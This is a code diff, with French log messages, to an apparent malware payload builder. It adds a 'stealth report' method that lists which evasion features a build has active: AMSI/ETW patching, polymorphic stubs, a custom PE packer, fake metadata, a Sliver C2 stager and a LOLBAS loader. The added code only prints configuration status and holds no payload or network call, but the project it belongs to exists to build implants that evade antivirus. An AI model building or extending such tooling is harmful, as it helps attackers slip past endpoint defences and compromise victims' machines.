@@ -62,6 +62,8 @@ class BuildDispatcher:
             self._generate_report(final_output, encrypted_data, keys)
 
             self.log(f"✅ Build terminé avec succès ! Fichier final : {final_output}")
+            self._report_stealth_details()
+
             return True, final_output
 
         except Exception as e:
@@ -112,3 +114,36 @@ class BuildDispatcher:
             self.log(f"📊 Rapport sauvegardé : {report_path}")
         except Exception as e:
             self.log(f"[!] Erreur lors de la génération du rapport : {e}")
+
+    def _report_stealth_details(self):
+        """🕵️ Rapport de furtivité (détail des modules actifs)"""
+        level = self.config.get('evasion_level', 'Basic')
+        enc = self.config.get('encryption_method', '')
+        loader = self.config.get("lolbas_loader", None)
+        c2 = self.config.get("c2_stager", None)
+
+        self.log("\n📊 Rapport furtivité :")
+        self.log("────────────────────────────────────────────")
+        self.log("🔐 Chiffrement                     : %-25s %s" % (enc, "✅ Actif"))
+
+        if level in ['Medium', 'High', 'Maximum']:
+            self.log("🧬 Obfuscation mémoire progressive : ✅ Actif")
+        else:
+            self.log("🧬 Obfuscation mémoire progressive : ❌ Inactif")
+
+        if level in ['High', 'Maximum']:
+            self.log("🧪 Patch AMSI / ETW                : ✅ Actif")
+            self.log("🌀 Flow polymorphique              : ✅ Actif")
+            self.log("🔒 Stub polymorphe                : ✅ Actif")
+            self.log("📦 Packer PE custom                : ✅ Actif")
+            self.log("🎭 Fake metadata / strings         : ✅ Actif")
+        else:
+            self.log("🧪 Patch AMSI / ETW                : ❌ Inactif")
+            self.log("🌀 Flow polymorphique              : ❌ Inactif")
+            self.log("🔒 Stub polymorphe                : ❌ Inactif")
+            self.log("📦 Packer PE custom                : ❌ Inactif")
+            self.log("🎭 Fake metadata / strings         : ❌ Inactif")
+
+        self.log("📡 Stager C2 (Sliver/HTTP)         : %s" % ("✅ Actif" if c2 else "❌ Non configuré"))
+        self.log("🧅 Loader LOLBAS                   : %s" % (f"✅ {loader}" if loader else "❌ Non généré"))
+        self.log("────────────────────────────────────────────\n")
